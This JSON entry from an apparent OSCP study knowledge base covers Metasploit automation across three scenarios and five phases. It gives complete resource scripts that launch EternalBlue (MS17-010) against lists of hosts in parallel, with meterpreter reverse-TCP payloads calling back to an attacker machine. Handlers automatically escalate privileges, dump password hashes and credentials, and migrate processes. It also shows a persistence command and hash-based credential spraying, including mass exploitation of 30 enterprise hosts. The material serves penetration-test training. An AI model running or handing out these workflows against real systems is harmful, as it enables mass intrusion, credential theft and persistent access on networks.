{
  "id": "metasploit-automation",
  "name": "Metasploit Automation - Resource Scripts & Batch Operations",
  "description": "Automated penetration testing workflows using Metasploit resource scripts, AutoRunScript handlers, and mass exploitation techniques for efficient OSCP lab practice and time-sensitive scenarios",
  "educational_header": {
    "how_to_recognize": [
      "Repetitive tasks across multiple targets (same exploit, same enumeration)",
      "Need to save and replay successful attack chains for documentation",
      "Multiple similar targets requiring identical exploitation steps",
      "Time-sensitive scenarios requiring rapid exploitation (OSCP exam time constraints)",
      "Requirement to automate post-exploitation on every new session (credential dumping, migration)",
      "Lab environment reset requiring re-exploitation of known vulnerabilities"
    ],
    "when_to_look_for": [
      "After manually exploiting target successfully (capture workflow for future replay)",
      "When OSCP lab resets and you need to quickly re-compromise known vulnerable boxes",
      "Multi-target networks with same vulnerability (mass exploitation)",
      "Repeated testing of exploit reliability (vulnerability research, testing payload variants)",
      "Time pressure scenarios (last hours of exam, need efficiency gains)",
      "Documentation requirements (resource scripts serve as reproducible proof of exploitation)"
    ]
  },
  "scenarios": [
    {
      "title": "Scenario 1: Resource Script for Automated Exploitation Workflow",
      "context": "Successfully exploited 5 Windows targets via MS17-010 (EternalBlue) during OSCP lab session. Lab will reset in 24 hours. Goal: Create resource script to automate re-exploitation after reset without manual intervention.",
      "approach": "Step 1: Create resource script file: nano /root/eternalblue_multi.rc. Step 2: Add database and workspace setup: 'use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false'. Step 3: Add target loop: 'set RHOSTS 192.168.45.100, exploit -j -z, set RHOSTS 192.168.45.101, exploit -j -z, ...' (repeat for each target). Step 4: Add post-exploitation automation: 'sleep 10, sessions -i 1 -c \"getsystem; hashdump; background\", sessions -i 2 -c \"getsystem; hashdump; background\"'. Step 5: Save script. Step 6: Execute resource script: msfconsole -r /root/eternalblue_multi.rc. Step 7: Monitor progress: jobs (shows running exploits), sessions -l (shows opened sessions). Step 8: Review results: loot (shows hashdump outputs saved to database).",
      "commands": ["msf-use-module", "msf-set-payload", "msf-set-lhost", "msf-set-lport", "msf-exploit-run", "msf-sessions-list", "msf-jobs-list"],
      "expected_outcome": "Resource script execution: msfconsole loads, reads script line-by-line, executes commands sequentially. Console output: '[*] Processing /root/eternalblue_multi.rc, [*] resource (/root/eternalblue_multi.rc)> use exploit/windows/smb/ms17_010_eternalblue, [*] resource> set RHOSTS 192.168.45.100, [*] resource> exploit -j -z, [*] Exploit running as background job 0, [*] Started reverse TCP handler on 192.168.45.5:4444, [*] Meterpreter session 1 opened'. After sleep, commands execute on sessions: 'getsystem' output, 'hashdump' output stored in loot. Time: 5-10 minutes to write script, 2-5 minutes to execute (faster than manual). Success indicators: jobs shows 5 background jobs (one per target), sessions -l shows 5 Meterpreter sessions, loot shows 5 credential dumps. Common issues: Script syntax errors (missing commas, wrong command format - test commands manually first), Exploit timing issues (sessions not opened before post-exploit commands - increase sleep duration), LHOST/LPORT conflicts (ensure handler ports unique if multiple handlers).",
      "why_this_works": "Resource scripts (.rc files): Plain text files with Metasploit console commands (one command per line), Executed sequentially by msfconsole via -r flag, Equivalent to typing commands manually (no special syntax), Supports all msfconsole commands (use, set, exploit, sessions, run, etc.). Script structure: Configuration section: use <module>, set <option> <value> (configure module once), Execution section: set RHOSTS <target>; exploit -j -z (repeat per target), Post-exploitation section: sleep <seconds> (wait for sessions), sessions -i <id> -c '<commands>' (run commands on session). Background exploitation (-j -z): exploit -j runs as background job (non-blocking), -z doesn't auto-interact (stays backgrounded), Allows script to continue to next target without waiting, Multiple exploits run in parallel (faster than sequential). Session command execution: sessions -c '<cmd>' -i <id> runs command on specific session without interaction, Example: sessions -i 1 -c 'getsystem' (escalate privileges on session 1), Supports multiple commands: sessions -i 1 -c 'getsystem; hashdump; run autoroute -s 10.10.10.0/24', Output stored in database (loot table) and console. Sleep for timing: Exploits need time to complete before post-exploitation, sleep 10 waits 10 seconds for sessions to open, Adjust based on network latency and target count (larger sleep for more targets). Resource script best practices: Add comments: Lines starting with # are comments, Example: '# Target 1: Windows 7 x64 - MS17-010', Set global options once: set payload, set LHOST, set LPORT (applies to all exploit runs), Use ExitOnSession false: Handler continues after first session (critical for multi-target). Creating resource scripts: Manual capture: During manual testing, copy successful commands to .rc file, Automated capture: makerc <file> (saves command history to resource script), Example: After successful manual exploitation: makerc /root/success.rc (saves recent commands). Executing resource scripts: From command line: msfconsole -r /root/script.rc (loads msfconsole with script), From msfconsole: resource /root/script.rc (execute while in msfconsole), Chaining scripts: msfconsole -r setup.rc -r exploit.rc -r post.rc (multiple scripts). OSCP use cases: Lab reset automation: Re-exploit known vulnerable boxes after reset (save 30-60 minutes), Exam preparation: Practice exploitation chains until muscle memory (speed improvement), Documentation: Resource scripts serve as reproducible proof of methodology, Testing: Verify exploit reliability across multiple targets (quality assurance). Example resource script (MS17-010 automation): '# MS17-010 Multi-Target Exploitation, use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, # Target 1, set RHOSTS 192.168.45.100, exploit -j -z, # Target 2, set RHOSTS 192.168.45.101, exploit -j -z, # Wait for sessions, sleep 15, # Post-exploitation, sessions -i 1 -c \"getsystem; hashdump; background\", sessions -i 2 -c \"getsystem; hashdump; background\"'. Troubleshooting: Script stops at error: Add error handling: set PROMPT false (don't wait for user input), Use && for conditional execution: set RHOSTS 192.168.45.100 && exploit, Commands not executing: Check syntax (no typos, correct module paths), Verify options required: show options (before exploit), Sessions not receiving commands: Increase sleep (sessions may not be ready), Check session IDs: sessions -l (verify IDs before -i flag). Advanced techniques: Looping in resource scripts: Use Ruby scripting in .rc (framework.sessions.each ...), Database queries: hosts -c address | grep 192.168.45 (get target list from database), Conditional execution: if session exists, run post-exploitation; else skip."
    },
    {
      "title": "Scenario 2: AutoRunScript for Automatic Post-Exploitation",
      "context": "Penetration test requires credential dumping on every compromised Windows host. Manual hashdump on 20 targets is time-consuming and error-prone. Goal: Configure handler to automatically dump credentials on every new session.",
      "approach": "Step 1: Create post-exploitation script: nano /root/auto_post.rc (resource script with post commands). Step 2: Add post-exploitation commands: 'getsystem, run post/windows/manage/migrate, hashdump, run post/windows/gather/enum_logged_on_users, background'. Step 3: Set up handler with AutoRunScript: use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; set AutoRunScript multi_console_command -rc /root/auto_post.rc; set ExitOnSession false; exploit -j. Step 4: Deliver payloads to targets (web upload, phishing, manual exploit). Step 5: As sessions open, AutoRunScript executes automatically. Step 6: Review results: loot (shows credentials from all sessions), creds (database credentials table). Step 7: Alternative - single-command AutoRunScript: set AutoRunScript 'multi_console_command -c \"getsystem; hashdump\"' (inline commands without .rc file).",
      "commands": ["msf-handler-autorunscript", "msf-handler-setup", "msf-handler-exitonsession"],
      "expected_outcome": "Handler starts: '[*] Started reverse TCP handler on 192.168.45.5:4444, [*] AutoRunScript: multi_console_command -rc /root/auto_post.rc'. When payload connects: '[*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened, [*] Session ID 1 processing AutoRunScript, [*] Running resource script: /root/auto_post.rc, [+] getsystem success: NT AUTHORITY\\SYSTEM, [*] Migrating to explorer.exe (PID 1824), [+] Migration successful, [+] Hashdump complete: Administrator:500:hash:hash:::, [*] Session backgrounded'. Process repeats for each new session (sessions 2, 3, 4...). loot shows: '192.168.45.100 - windows.hashes.mscache (Administrator, Guest, bob)', '192.168.45.101 - windows.hashes.mscache (...)'. Time: 1-2 minutes to configure AutoRunScript, 0 seconds manual intervention per session (fully automated). Advantages: No manual interaction needed per session, Consistent post-exploitation (no missed steps), Fast (credentials dumped within seconds of session opening), Scalable (works with 1 or 100 sessions). Common issues: AutoRunScript fails and session dies (script too aggressive - test manually first), Migration kills session (choose stable process in script), Script timeout (Metasploit kills script after 60s default - keep scripts under 60s).",
      "why_this_works": "AutoRunScript mechanics: Handler option that executes script on every new session, Triggers after Meterpreter stage loads (before user interaction), Runs in session context (commands execute on target as if typed manually), Supports: Resource scripts (-rc <file>), Inline commands (-c '<commands>'), Post-exploitation modules (run post/...). multi_console_command module: Metasploit module for running console/Meterpreter commands, Usage: multi_console_command -rc <script.rc> (execute resource script), multi_console_command -c '<command>' (execute inline command), Runs in Meterpreter context if session is Meterpreter, Runs in console context if command shell. AutoRunScript use cases: Credential dumping: hashdump, load kiwi; creds_all (automatic on every session), Process migration: run post/windows/manage/migrate (stabilize session immediately), Enumeration: run post/windows/gather/enum_system (collect system info), Persistence: run persistence -X -i 60 -p 443 -r <LHOST> (auto-install persistence). AutoRunScript vs manual post-exploitation: Manual: Open session → getsystem → hashdump → background (1-2 minutes per session × 20 sessions = 20-40 minutes), AutoRunScript: Configure once → automatic on all sessions (0 minutes per session, 20-40 minutes saved). Configuration examples: Credential dumping: set AutoRunScript 'multi_console_command -c \"getsystem; hashdump\"', Process migration + hashdump: set AutoRunScript 'multi_console_command -c \"run post/windows/manage/migrate; getsystem; hashdump\"', Full enumeration: set AutoRunScript multi_console_command -rc /root/full_enum.rc (resource script with 10+ commands). Resource script for AutoRunScript (/root/auto_post.rc): '# Automatic Post-Exploitation, # Escalate privileges, getsystem, # Migrate to stable process, run post/windows/manage/migrate, # Dump credentials, hashdump, # Enumerate logged-on users, run post/windows/gather/enum_logged_on_users, # Background session for next payload, background'. Troubleshooting: AutoRunScript kills session: Script too aggressive (migration fails, getsystem crashes service), Solution: Test script manually first (verify all commands succeed), Remove risky commands (migration may fail on some systems). Script timeout (Metasploit default 60 seconds): Long scripts exceed timeout (Metasploit kills AutoRunScript after 60s), Solution: Keep scripts under 60s (remove non-critical commands), Increase timeout: set AutoRunScriptTimeout 120 (in seconds). AutoRunScript not executing: Verify option set before exploit: show options | grep AutoRunScript, Check script path correct: ls -l /root/auto_post.rc (file exists?), Check script syntax: resource /root/auto_post.rc (test manually). Session backgrounding in AutoRunScript: Always end script with 'background' (prevents blocking next session), Without background: AutoRunScript waits for user interaction (defeats automation), Ctrl+Z doesn't work in AutoRunScript context (script must background itself). OSCP exam strategy: Set up AutoRunScript handler at start of exam, Use for all Windows targets (automatic credential dumping), Saves 5-10 minutes per target (significant time savings), Reduces errors (no missed hashdumps), Provides backup (credentials saved to database even if session lost later). Advanced AutoRunScript techniques: Conditional execution: if getuid != SYSTEM, run getsystem, Multi-OS support: Detect OS (sysinfo), run Windows or Linux post-exploitation accordingly, Pivoting automation: Detect additional networks (ipconfig), add autoroute automatically, Error handling: Ignore failures (getsystem may fail, continue to hashdump anyway). Alternative automation approaches: Session scripting: sessions -c '<commands>' (run commands on existing sessions, not automatic), Post-exploitation modules: use post/multi/manage/shell_to_meterpreter; set SESSION 1; run (upgrade specific session), Makerc: makerc <file> (save command history for replay, not automatic). Comparison: AutoRunScript vs Resource Scripts: AutoRunScript: Automatic (triggers on session open), Per-session (runs on every new session), Handler configuration (set once, applies to all sessions), Resource Scripts: Manual (user executes), One-time or looped (executes commands in sequence), Console-level (not tied to specific session)."
    },
    {
      "title": "Scenario 3: Mass Exploitation with Database Queries and Looping",
      "context": "Penetration test of enterprise network with 50 Windows hosts. Vulnerability scan shows 30 hosts vulnerable to MS17-010. Goal: Exploit all vulnerable hosts in parallel, manage sessions efficiently, extract credentials from all compromised systems.",
      "approach": "Step 1: Import vulnerability scan results: db_import /root/vuln_scan.xml (nmap or Nessus XML). Step 2: Filter vulnerable hosts: services -p 445 -c address,info > /tmp/smb_hosts.txt (extract SMB hosts). Step 3: Create resource script for mass exploitation: nano /root/mass_eternalblue.rc. Step 4: Add handler and exploitation loop: 'use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, set AutoRunScript multi_console_command -c \"getsystem; hashdump; background\"'. Step 5: Add target list from database: hosts -R (auto-populate RHOSTS from workspace hosts), OR manually: 'set RHOSTS file:/tmp/smb_hosts.txt' (read from file). Step 6: Execute mass exploitation: exploit -j -z. Step 7: Monitor progress: jobs -l (active exploits), sessions -l (opened sessions), watch -n 5 'msfconsole -x \"sessions -l; exit\"' (auto-refresh session list). Step 8: Collect results: loot (credentials), db_export -f xml /root/results.xml (export all findings).",
      "commands": ["msf-db-import", "msf-services-filter-port", "msf-hosts-list", "msf-use-module", "msf-set-option", "msf-exploit-run", "msf-sessions-list", "msf-jobs-list", "msf-db-export"],
      "expected_outcome": "Database import: '[*] Importing nmap XML file, [*] Import complete: 50 hosts, 150 services'. services filter: 30 SMB hosts extracted. Resource script execution: exploit -j -z starts 30 background jobs (one per host). jobs -l shows: 'Id 0: Exploit: windows/smb/ms17_010_eternalblue RHOSTS: 192.168.45.100, Id 1: ... RHOSTS: 192.168.45.101, ...' (30 total). Sessions open over 5-10 minutes: '[*] Meterpreter session 1 opened (192.168.45.100), AutoRunScript executes: getsystem → hashdump → background, [*] Meterpreter session 2 opened (192.168.45.101), ...' (up to 30 sessions). Time: 10-15 minutes for 30 hosts (vs 60-90 minutes manually). Success rate: 70-90% of vulnerable hosts exploited (some may have firewalls or recent patches). loot shows credentials from all successful exploitations. Efficiency gain: 30 hosts exploited in time of 5-10 (parallel execution). Manual approach: Exploit one host → wait for session → post-exploit → move to next (sequential, slow). Automated approach: Launch all exploits in parallel → sessions open asynchronously → AutoRunScript handles post-exploit (parallel, fast).",
      "why_this_works": "Mass exploitation strategy: Parallel vs sequential execution: Sequential: Exploit host 1 → session opens → post-exploit → exploit host 2 → ... (1-2 min per host × 30 = 30-60 min), Parallel: Exploit all 30 hosts simultaneously → sessions open asynchronously → AutoRunScript handles post-exploit (5-10 min total). Database-driven targeting: db_import loads scan results into Metasploit database, services -p 445 filters to SMB hosts only (relevant targets), hosts -R auto-populates RHOSTS from workspace (no manual IP entry), Supports complex queries: services -p 445 -s 'Windows 7' -R (filter by OS version). Background job management: exploit -j -z launches exploit as background job (non-blocking), Metasploit manages job queue (tracks all running exploits), jobs -l shows active jobs, jobs -k <id> kills specific job, jobs -K kills all jobs. Session management at scale: ExitOnSession false: Handler continues after first session (critical for multi-target), AutoRunScript: Automatic post-exploitation on every session (eliminates manual work), sessions -l: List all sessions with status (alive/dead), sessions -K: Kill all sessions (cleanup). Resource script for mass exploitation (/root/mass_eternalblue.rc): '# Mass MS17-010 Exploitation, # Configure exploit, use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, set AutoRunScript multi_console_command -c \"getsystem; hashdump; background\", # Auto-populate targets from database, hosts -R, # Execute in background, exploit -j -z'. Alternative target population methods: File-based: set RHOSTS file:/tmp/targets.txt (one IP per line), CIDR range: set RHOSTS 192.168.45.0/24 (Metasploit auto-expands), Comma-separated: set RHOSTS 192.168.45.100,192.168.45.101,192.168.45.102. Monitoring mass exploitation: Real-time monitoring: watch -n 5 'msfconsole -x \"sessions -l; jobs -l; exit\"' (auto-refresh every 5 seconds), Job completion: jobs -l | wc -l (count active jobs, decreases as exploits complete), Session count: sessions -l | grep meterpreter | wc -l (count successful exploits). Credential extraction at scale: AutoRunScript hashdump: Credentials stored in loot table automatically, loot -t windows.hashes (filter to password hashes only), creds: View all credentials across all sessions (username:hash pairs), db_export: Export all credentials to XML/JSON for reporting. Threading and performance: Metasploit default: 1 thread per exploit job (30 jobs = 30 threads), Performance tuning: set THREADS 5 (increase threads per job for faster exploitation), Risk: Too many threads can overwhelm target network (dropped packets, failed exploits), Recommended: THREADS 1-5 for stable exploitation, adjust based on network capacity. Success rate optimization: Verify vulnerability first: use auxiliary/scanner/smb/smb_ms17_010; hosts -R; run (confirm vulnerable before exploit), Filter false positives: Only exploit hosts confirmed vulnerable (increase success rate), Retry failures: After mass exploitation, re-run exploit on failed hosts (some may succeed on retry). Troubleshooting mass exploitation: Exploits hang or fail: Network congestion (reduce parallel jobs: exploit in batches of 10), Firewall blocking (some hosts may be protected, normal in large-scale), Resource exhaustion: Too many sessions (migrate sessions to stable processes, kill dead sessions: sessions -K -z). Sessions die quickly: Unstable payloads (use non-staged for stability: set payload windows/x64/meterpreter_reverse_tcp), AutoRunScript killing sessions (remove risky commands like migration). Handler not catching all sessions: Port exhaustion (handler on single port may miss some connections), Solution: Use port ranges: set LPORT 4444-4454 (handler listens on multiple ports). OSCP exam considerations: Mass exploitation less common in exam (3-5 targets, not 30), Use techniques for lab practice (exploit all lab machines efficiently), Time savings: AutoRunScript + resource scripts save 30-60 minutes in lab rotations, Exam strategy: Prepare resource scripts for common exploits (MS17-010, EternalBlue, Shellshock), execute quickly if encountered. Advanced automation: Dynamic target selection: hosts -S 'Windows 7' -R (filter by OS, auto-populate), Post-exploitation routing: AutoRunScript adds routes: 'run autoroute -s 10.10.10.0/24', Credential spraying post-compromise: After hashdump, automatically test credentials across all hosts: 'use auxiliary/scanner/smb/smb_login; set SMBUser administrator; set SMBPass <hash>; hosts -R; run'."
    }
  ],
  "sections": [
    {
      "title": "Phase 1: Resource Script Creation (Capture Successful Workflow)",
      "notes": "After successful manual exploitation, capture workflow for automation. Use makerc <file> to save command history. Alternatively, manually create .rc file with commands. Include: Module selection (use, set), Target configuration (set RHOSTS), Execution (exploit -j -z), Post-exploitation (sessions -c commands). Test resource script: msfconsole -r <file>. Estimated time: 5-10 minutes to create and test.",
      "commands": ["msf-use-module", "msf-set-option", "msf-exploit-run"]
    },
    {
      "title": "Phase 2: AutoRunScript Configuration (Automatic Post-Exploitation)",
      "notes": "Configure handler with AutoRunScript for automatic post-exploitation on every session. Create post-exploitation .rc file or use inline commands. Set AutoRunScript: set AutoRunScript 'multi_console_command -rc <file>' or set AutoRunScript 'multi_console_command -c \"<commands>\"'. Include: getsystem (privilege escalation), hashdump (credential dumping), migration (stability), background (allow next session). Set ExitOnSession false (multi-session support). Estimated time: 2-3 minutes to configure.",
      "commands": ["msf-handler-autorunscript", "msf-handler-setup", "msf-handler-exitonsession"]
    },
    {
      "title": "Phase 3: Database-Driven Targeting (Mass Exploitation Setup)",
      "notes": "Import scan results: db_import <nmap.xml>. Filter targets: services -p <PORT> -R (auto-populate RHOSTS). Alternative: Export to file: services -p 445 -c address > targets.txt; set RHOSTS file:targets.txt. Verify target count: show options | grep RHOSTS. Configure handler with ExitOnSession false and AutoRunScript. Estimated time: 2-5 minutes for import and filtering.",
      "commands": ["msf-db-import", "msf-services-filter-port", "msf-hosts-list", "msf-set-option"]
    },
    {
      "title": "Phase 4: Parallel Execution and Monitoring",
      "notes": "Execute mass exploitation: exploit -j -z (background jobs for all targets). Monitor progress: jobs -l (active exploits), sessions -l (opened sessions), watch -n 5 'msfconsole -x \"sessions -l; exit\"' (auto-refresh). Wait for sessions to open (5-15 minutes depending on target count). AutoRunScript handles post-exploitation automatically. Estimated time: 5-15 minutes for exploitation to complete.",
      "commands": ["msf-exploit-run", "msf-jobs-list", "msf-sessions-list"]
    },
    {
      "title": "Phase 5: Results Collection and Documentation",
      "notes": "Review credentials: loot (all credential dumps), creds (database credentials table). Export findings: db_export -f xml /root/results.xml (includes hosts, services, credentials, sessions). Document resource scripts for reporting (reproducible methodology). Cleanup: sessions -K (kill all sessions), jobs -K (kill all jobs). Save successful resource scripts for future use. Estimated time: 5-10 minutes for collection and export.",
      "commands": ["msf-sessions-list", "msf-db-export", "msf-jobs-list"]
    }
  ],
  "tags": ["METASPLOIT", "AUTOMATION", "RESOURCE_SCRIPTS", "AUTORUNSCRIPT", "MASS_EXPLOITATION", "EFFICIENCY", "OSCP:MEDIUM", "TIME_SAVING"]
}
